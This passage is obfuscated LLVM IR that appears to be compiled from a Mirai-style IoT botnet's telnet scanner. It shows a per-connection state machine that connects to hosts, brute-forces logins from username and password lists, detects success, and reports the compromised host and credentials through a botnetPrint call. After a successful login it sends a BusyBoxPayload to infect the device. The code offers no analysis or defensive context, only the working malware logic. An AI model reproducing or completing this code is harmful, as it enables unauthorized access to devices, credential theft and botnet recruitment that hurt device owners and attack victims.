  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = icmp eq i32 %217, -1
  br i1 %218, label %219, label %220

; <label>:219:                                    ; preds = %195
  br label %738

; <label>:220:                                    ; preds = %195
  %221 = load i32, i32* %5, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %222
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %223, i32 0, i32 0
  %225 = load i32, i32* %224, align 16
  %226 = load i32, i32* %5, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %227
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 16
  %231 = call i32 (i32, i32, ...) @fcntl(i32 %230, i32 3, i8* null)
  %232 = and i32 %231, 2048
  %233 = xor i32 %231, 2048
  %234 = or i32 %232, %233
  %235 = or i32 %231, 2048
  %236 = call i32 (i32, i32, ...) @fcntl(i32 %225, i32 4, i32 %234)
  %237 = load i32, i32* %5, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 0
  %241 = load i32, i32* %240, align 16
  %242 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %243 = call i32 @connect(i32 %241, %struct.sockaddr* %242, i32 16)
  %244 = icmp eq i32 %243, -1
  br i1 %244, label %245, label %253

; <label>:245:                                    ; preds = %220
  %246 = call i32* @__errno_location() #10
  %247 = load i32, i32* %246, align 4
  %248 = icmp ne i32 %247, 115
  br i1 %248, label %249, label %253

; <label>:249:                                    ; preds = %245
  %250 = load i32, i32* %5, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %251
  call void @reset_telstate(%struct.telstate_t* %252)
  br label %257

; <label>:253:                                    ; preds = %245, %220
  %254 = load i32, i32* %5, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %255
  call void @advance_state(%struct.telstate_t* %256, i32 1)
  br label %257

; <label>:257:                                    ; preds = %253, %249
  br label %737

; <label>:258:                                    ; preds = %107
  br label %259

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %261 = getelementptr inbounds [16 x i64], [16 x i64]* %260, i64 0, i64 0
  %262 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %261) #3, !srcloc !6
  %263 = extractvalue { i64, i64* } %262, 0
  %264 = extractvalue { i64, i64* } %262, 1
  %265 = trunc i64 %263 to i32
  store i32 %265, i32* %21, align 4
  %266 = ptrtoint i64* %264 to i64
  %267 = trunc i64 %266 to i32
  store i32 %267, i32* %22, align 4
  br label %268

; <label>:268:                                    ; preds = %259
  br label %269

; <label>:269:                                    ; preds = %268
  %270 = load i32, i32* %5, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 0
  %274 = load i32, i32* %273, align 16
  %275 = srem i32 %274, 64
  %276 = zext i32 %275 to i64
  %277 = shl i64 1, %276
  %278 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %279 = load i32, i32* %5, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = sdiv i32 %283, 64
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [16 x i64], [16 x i64]* %278, i64 0, i64 %285
  %287 = load i64, i64* %286, align 8
  %288 = xor i64 %287, -1
  %289 = xor i64 %277, -1
  %290 = xor i64 -3612816979434337645, -1
  %291 = and i64 %288, -3612816979434337645
  %292 = and i64 %287, %290
  %293 = and i64 %289, -3612816979434337645
  %294 = and i64 %277, %290
  %295 = or i64 %291, %292
  %296 = or i64 %293, %294
  %297 = xor i64 %295, %296
  %298 = or i64 %288, %289
  %299 = xor i64 %298, -1
  %300 = or i64 -3612816979434337645, %290
  %301 = and i64 %299, %300
  %302 = or i64 %297, %301
  %303 = or i64 %287, %277
  store i64 %302, i64* %286, align 8
  %304 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %304, align 8
  %305 = load i32, i32* %3, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %306, i64* %307, align 8
  %308 = load i32, i32* %5, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = sub i32 0, 1
  %314 = sub i32 %312, %313
  %315 = add nsw i32 %312, 1
  %316 = call i32 @select(i32 %314, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %316, i32* %6, align 4
  %317 = load i32, i32* %6, align 4
  %318 = icmp eq i32 %317, 1
  br i1 %318, label %319, label %354

; <label>:319:                                    ; preds = %269
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %320 = load i32, i32* %5, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 16
  %325 = bitcast i32* %15 to i8*
  %326 = call i32 @getsockopt(i32 %324, i32 1, i32 4, i8* %325, i32* %14) #3
  %327 = load i32, i32* %15, align 4
  %328 = icmp ne i32 %327, 0
  br i1 %328, label %329, label %333

; <label>:329:                                    ; preds = %319
  %330 = load i32, i32* %5, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %331
  call void @reset_telstate(%struct.telstate_t* %332)
  br label %353

; <label>:333:                                    ; preds = %319
  %334 = load i32, i32* %5, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %336, i32 0, i32 0
  %338 = load i32, i32* %337, align 16
  %339 = load i32, i32* %5, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %340
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %341, i32 0, i32 0
  %343 = load i32, i32* %342, align 16
  %344 = call i32 (i32, i32, ...) @fcntl(i32 %343, i32 3, i8* null)
  %345 = xor i32 -2049, -1
  %346 = xor i32 %344, %345
  %347 = and i32 %346, %344
  %348 = and i32 %344, -2049
  %349 = call i32 (i32, i32, ...) @fcntl(i32 %338, i32 4, i32 %347)
  %350 = load i32, i32* %5, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %351
  call void @advance_state(%struct.telstate_t* %352, i32 2)
  br label %353

; <label>:353:                                    ; preds = %333, %329
  br label %738

; <label>:354:                                    ; preds = %269
  %355 = load i32, i32* %6, align 4
  %356 = icmp eq i32 %355, -1
  br i1 %356, label %357, label %361

; <label>:357:                                    ; preds = %354
  %358 = load i32, i32* %5, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %359
  call void @reset_telstate(%struct.telstate_t* %360)
  br label %738

; <label>:361:                                    ; preds = %354
  br label %362

; <label>:362:                                    ; preds = %361
  %363 = load i32, i32* %5, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %364
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %365, i32 0, i32 7
  %367 = load i32, i32* %366, align 16
  %368 = sub i32 0, 5
  %369 = sub i32 %367, %368
  %370 = add i32 %367, 5
  %371 = zext i32 %369 to i64
  %372 = call i64 @time(i64* null) #3
  %373 = icmp slt i64 %371, %372
  br i1 %373, label %374, label %378

; <label>:374:                                    ; preds = %362
  %375 = load i32, i32* %5, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %376
  call void @reset_telstate(%struct.telstate_t* %377)
  br label %378

; <label>:378:                                    ; preds = %374, %362
  br label %737

; <label>:379:                                    ; preds = %107
  %380 = load i32, i32* %5, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 0
  %384 = load i32, i32* %383, align 16
  %385 = load i32, i32* %3, align 4
  %386 = load i32, i32* %5, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 9
  %390 = load i8*, i8** %389, align 8
  %391 = call i32 @read_until_response(i32 %384, i32 %385, i8* %390, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %392 = icmp ne i32 %391, 0
  br i1 %392, label %393, label %410

; <label>:393:                                    ; preds = %379
  %394 = load i32, i32* %5, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %395
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %396, i32 0, i32 9
  %398 = load i8*, i8** %397, align 8
  %399 = call i32 @contains_fail(i8* %398)
  %400 = icmp ne i32 %399, 0
  br i1 %400, label %401, label %405

; <label>:401:                                    ; preds = %393
  %402 = load i32, i32* %5, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %403
  call void @advance_state(%struct.telstate_t* %404, i32 0)
  br label %409

; <label>:405:                                    ; preds = %393
  %406 = load i32, i32* %5, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %407
  call void @advance_state(%struct.telstate_t* %408, i32 3)
  br label %409

; <label>:409:                                    ; preds = %405, %401
  br label %738

; <label>:410:                                    ; preds = %379
  %411 = load i32, i32* %5, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 7
  %415 = load i32, i32* %414, align 16
  %416 = sub i32 %415, 1235539133
  %417 = add i32 %416, 7
  %418 = add i32 %417, 1235539133
  %419 = add i32 %415, 7
  %420 = zext i32 %418 to i64
  %421 = call i64 @time(i64* null) #3
  %422 = icmp slt i64 %420, %421
  br i1 %422, label %423, label %427

; <label>:423:                                    ; preds = %410
  %424 = load i32, i32* %5, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %425
  call void @reset_telstate(%struct.telstate_t* %426)
  br label %427

; <label>:427:                                    ; preds = %423, %410
  br label %737

; <label>:428:                                    ; preds = %107
  %429 = load i32, i32* %5, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %430
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %431, i32 0, i32 0
  %433 = load i32, i32* %432, align 16
  %434 = load i32, i32* %5, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 4
  %438 = load i8, i8* %437, align 2
  %439 = zext i8 %438 to i64
  %440 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %439
  %441 = load i8*, i8** %440, align 8
  %442 = load i32, i32* %5, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %443
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %444, i32 0, i32 4
  %446 = load i8, i8* %445, align 2
  %447 = zext i8 %446 to i64
  %448 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %447
  %449 = load i8*, i8** %448, align 8
  %450 = call i64 @strlen(i8* %449) #9
  %451 = call i64 @send(i32 %433, i8* %441, i64 %450, i32 16384)
  %452 = icmp slt i64 %451, 0
  br i1 %452, label %453, label %457

; <label>:453:                                    ; preds = %428
  %454 = load i32, i32* %5, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %455
  call void @reset_telstate(%struct.telstate_t* %456)
  br label %738

; <label>:457:                                    ; preds = %428
  %458 = load i32, i32* %5, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 0
  %462 = load i32, i32* %461, align 16
  %463 = call i64 @send(i32 %462, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.96, i32 0, i32 0), i64 2, i32 16384)
  %464 = icmp slt i64 %463, 0
  br i1 %464, label %465, label %469

; <label>:465:                                    ; preds = %457
  %466 = load i32, i32* %5, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %467
  call void @reset_telstate(%struct.telstate_t* %468)
  br label %738

; <label>:469:                                    ; preds = %457
  %470 = load i32, i32* %5, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %471
  call void @advance_state(%struct.telstate_t* %472, i32 4)
  br label %737

; <label>:473:                                    ; preds = %107
  %474 = load i32, i32* %5, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 0
  %478 = load i32, i32* %477, align 16
  %479 = load i32, i32* %3, align 4
  %480 = load i32, i32* %5, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 9
  %484 = load i8*, i8** %483, align 8
  %485 = call i32 @read_until_response(i32 %478, i32 %479, i8* %484, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %486 = icmp ne i32 %485, 0
  br i1 %486, label %487, label %504

; <label>:487:                                    ; preds = %473
  %488 = load i32, i32* %5, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %489
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %490, i32 0, i32 9
  %492 = load i8*, i8** %491, align 8
  %493 = call i32 @contains_fail(i8* %492)
  %494 = icmp ne i32 %493, 0
  br i1 %494, label %495, label %499

; <label>:495:                                    ; preds = %487
  %496 = load i32, i32* %5, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %497
  call void @advance_state(%struct.telstate_t* %498, i32 0)
  br label %503

; <label>:499:                                    ; preds = %487
  %500 = load i32, i32* %5, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %501
  call void @advance_state(%struct.telstate_t* %502, i32 5)
  br label %503

; <label>:503:                                    ; preds = %499, %495
  br label %738

; <label>:504:                                    ; preds = %473
  %505 = load i32, i32* %5, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %506
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %507, i32 0, i32 7
  %509 = load i32, i32* %508, align 16
  %510 = sub i32 %509, 1997115403
  %511 = add i32 %510, 3
  %512 = add i32 %511, 1997115403
  %513 = add i32 %509, 3
  %514 = zext i32 %512 to i64
  %515 = call i64 @time(i64* null) #3
  %516 = icmp slt i64 %514, %515
  br i1 %516, label %517, label %521

; <label>:517:                                    ; preds = %504
  %518 = load i32, i32* %5, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %519
  call void @reset_telstate(%struct.telstate_t* %520)
  br label %521

; <label>:521:                                    ; preds = %517, %504
  br label %737

; <label>:522:                                    ; preds = %107
  %523 = load i32, i32* %5, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 16
  %528 = load i32, i32* %5, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 5
  %532 = load i8, i8* %531, align 1
  %533 = zext i8 %532 to i64
  %534 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %533
  %535 = load i8*, i8** %534, align 8
  %536 = load i32, i32* %5, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 5
  %540 = load i8, i8* %539, align 1
  %541 = zext i8 %540 to i64
  %542 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %541
  %543 = load i8*, i8** %542, align 8
  %544 = call i64 @strlen(i8* %543) #9
  %545 = call i64 @send(i32 %527, i8* %535, i64 %544, i32 16384)
  %546 = icmp slt i64 %545, 0
  br i1 %546, label %547, label %551

; <label>:547:                                    ; preds = %522
  %548 = load i32, i32* %5, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %549
  call void @reset_telstate(%struct.telstate_t* %550)
  br label %738

; <label>:551:                                    ; preds = %522
  %552 = load i32, i32* %5, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 0
  %556 = load i32, i32* %555, align 16
  %557 = call i64 @send(i32 %556, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.96, i32 0, i32 0), i64 2, i32 16384)
  %558 = icmp slt i64 %557, 0
  br i1 %558, label %559, label %563

; <label>:559:                                    ; preds = %551
  %560 = load i32, i32* %5, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %561
  call void @reset_telstate(%struct.telstate_t* %562)
  br label %738

; <label>:563:                                    ; preds = %551
  %564 = load i32, i32* %5, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %565
  call void @advance_state(%struct.telstate_t* %566, i32 6)
  br label %737

; <label>:567:                                    ; preds = %107
  %568 = load i32, i32* %5, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 0
  %572 = load i32, i32* %571, align 16
  %573 = load i32, i32* %3, align 4
  %574 = load i32, i32* %5, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 9
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @read_until_response(i32 %572, i32 %573, i8* %578, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %580 = icmp ne i32 %579, 0
  br i1 %580, label %581, label %652

; <label>:581:                                    ; preds = %567
  %582 = call i64 @time(i64* null) #3
  %583 = trunc i64 %582 to i32
  %584 = load i32, i32* %5, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 7
  store i32 %583, i32* %587, align 16
  %588 = load i32, i32* %5, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 9
  %592 = load i8*, i8** %591, align 8
  %593 = call i32 @contains_fail(i8* %592)
  %594 = icmp ne i32 %593, 0
  br i1 %594, label %595, label %599

; <label>:595:                                    ; preds = %581
  %596 = load i32, i32* %5, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %597
  call void @advance_state(%struct.telstate_t* %598, i32 0)
  br label %651

; <label>:599:                                    ; preds = %581
  %600 = load i32, i32* %5, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 9
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @contains_success(i8* %604)
  %606 = icmp ne i32 %605, 0
  br i1 %606, label %607, label %646

; <label>:607:                                    ; preds = %599
  %608 = load i32, i32* %5, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 3
  %612 = load i8, i8* %611, align 1
  %613 = zext i8 %612 to i32
  %614 = icmp eq i32 %613, 2
  br i1 %614, label %615, label %619

; <label>:615:                                    ; preds = %607
  %616 = load i32, i32* %5, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %617
  call void @advance_state(%struct.telstate_t* %618, i32 7)
  br label %645

; <label>:619:                                    ; preds = %607
  %620 = load i32, i32* @KadenCommStock, align 4
  %621 = load i32, i32* %5, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %622
  %624 = call i8* @get_telstate_host(%struct.telstate_t* %623)
  %625 = load i32, i32* %5, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 4
  %629 = load i8, i8* %628, align 2
  %630 = zext i8 %629 to i64
  %631 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %630
  %632 = load i8*, i8** %631, align 8
  %633 = load i32, i32* %5, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 5
  %637 = load i8, i8* %636, align 1
  %638 = zext i8 %637 to i64
  %639 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %638
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 (i32, i8*, ...) @botnetPrint(i32 %620, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.97, i32 0, i32 0), i8* %624, i8* %632, i8* %640)
  %642 = load i32, i32* %5, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %643
  call void @advance_state(%struct.telstate_t* %644, i32 7)
  br label %645

; <label>:645:                                    ; preds = %619, %615
  br label %650

; <label>:646:                                    ; preds = %599
  %647 = load i32, i32* %5, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %648
  call void @reset_telstate(%struct.telstate_t* %649)
  br label %650

; <label>:650:                                    ; preds = %646, %645
  br label %651

; <label>:651:                                    ; preds = %650, %595
  br label %738

; <label>:652:                                    ; preds = %567
  %653 = load i32, i32* %5, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 7
  %657 = load i32, i32* %656, align 16
  %658 = sub i32 %657, -1049231657
  %659 = add i32 %658, 7
  %660 = add i32 %659, -1049231657
  %661 = add i32 %657, 7
  %662 = zext i32 %660 to i64
  %663 = call i64 @time(i64* null) #3
  %664 = icmp slt i64 %662, %663
  br i1 %664, label %665, label %669

; <label>:665:                                    ; preds = %652
  %666 = load i32, i32* %5, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %667
  call void @reset_telstate(%struct.telstate_t* %668)
  br label %669

; <label>:669:                                    ; preds = %665, %652
  br label %737

; <label>:670:                                    ; preds = %107
  %671 = call i64 @time(i64* null) #3
  %672 = trunc i64 %671 to i32
  %673 = load i32, i32* %5, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 7
  store i32 %672, i32* %676, align 16
  %677 = load i32, i32* %5, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 0
  %681 = load i32, i32* %680, align 16
  %682 = call i64 @send(i32 %681, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.98, i32 0, i32 0), i64 4, i32 16384)
  %683 = icmp slt i64 %682, 0
  br i1 %683, label %684, label %685

; <label>:684:                                    ; preds = %670
  br label %685

; <label>:685:                                    ; preds = %684, %670
  %686 = load i32, i32* %5, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %687
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %688, i32 0, i32 0
  %690 = load i32, i32* %689, align 16
  %691 = call i64 @send(i32 %690, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.99, i32 0, i32 0), i64 7, i32 16384)
  %692 = icmp slt i64 %691, 0
  br i1 %692, label %693, label %694

; <label>:693:                                    ; preds = %685
  br label %694

; <label>:694:                                    ; preds = %693, %685
  %695 = load i32, i32* %5, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 0
  %699 = load i32, i32* %698, align 16
  %700 = load i8*, i8** @BusyBoxPayload, align 8
  %701 = load i8*, i8** @BusyBoxPayload, align 8
  %702 = call i64 @strlen(i8* %701) #9
  %703 = call i64 @send(i32 %699, i8* %700, i64 %702, i32 16384)
  %704 = icmp slt i64 %703, 0
  br i1 %704, label %705, label %709

; <label>:705:                                    ; preds = %694
  %706 = load i32, i32* %5, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %707
  call void @reset_telstate(%struct.telstate_t* %708)
  br label %738

; <label>:709:                                    ; preds = %694
  %710 = load i32, i32* %5, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %711
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %712, i32 0, i32 7
  %714 = load i32, i32* %713, align 16
  %715 = sub i32 0, %714
  %716 = sub i32 0, 25
  %717 = add i32 %715, %716
  %718 = sub i32 0, %717
  %719 = add i32 %714, 25
  %720 = zext i32 %718 to i64
  %721 = call i64 @time(i64* null) #3
  %722 = icmp slt i64 %720, %721
  br i1 %722, label %723, label %736

; <label>:723:                                    ; preds = %709
  %724 = load i32, i32* %5, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %725
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %726, i32 0, i32 3
  %728 = load i8, i8* %727, align 1
  %729 = zext i8 %728 to i32
  %730 = icmp ne i32 %729, 3
